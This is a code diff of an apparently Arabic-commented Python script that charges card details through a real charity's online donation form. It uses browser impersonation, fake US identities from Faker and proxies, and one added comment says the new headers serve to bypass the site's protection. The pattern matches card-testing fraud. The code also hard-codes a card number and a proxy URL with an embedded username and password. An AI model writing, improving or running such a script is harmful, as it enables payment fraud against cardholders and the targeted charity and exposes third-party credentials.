@@ -6,7 +6,6 @@ import asyncio
 from faker import Faker
 from curl_cffi.requests import AsyncSession
 
-# تم الاعتماد على الهوية الأمريكية US
 fake = Faker("en_US")
 
 class tools:
@@ -60,14 +59,20 @@ class Gateway:
     async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
         token = secrets.token_hex(16)
 
-        # تحديد إصدار المتصفح chrome120
         async with AsyncSession(impersonate="chrome120", proxies=proxies) as session:
             try:
-                # 1. الطلب الأولي (GET) - بدون تمرير ترويسات يدوية لتجنب التعارض
-                resp_init = await session.get("https://bukjeh.org/donations/donation-2023-2-3/")
+                # 1. الطلب الأولي (GET) - مع إضافة الترويسات المطلوبة للتحايل على الحماية
+                headers_init = {
+                    "referer": "https://bukjeh.org/",
+                    "upgrade-insecure-requests": "1"
+                }
+                resp_init = await session.get(
+                    "https://bukjeh.org/donations/donation-2023-2-3/", 
+                    headers=headers_init
+                )
                 html = resp_init.text
                 
-                # استخدام مكتبة re لاستخراج الحقول بدقة من الصفحة
+                # استخراج الحقول عبر re
                 hash_match = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
                 pre_match = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
                 give_match = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
@@ -216,7 +221,6 @@ class Gateway:
 
 async def main():
     test_card = "4211566115568609|12|28|321"
-    # استبدل البروكسي بالبروكسي المتاح لديك إذا رغبت
     proxy = "http://purevpn0s2232045:hww8fqbr72j0@px016104.pointtoserver.com:10780"
     proxies_dict = {"http": proxy, "https": proxy}
     
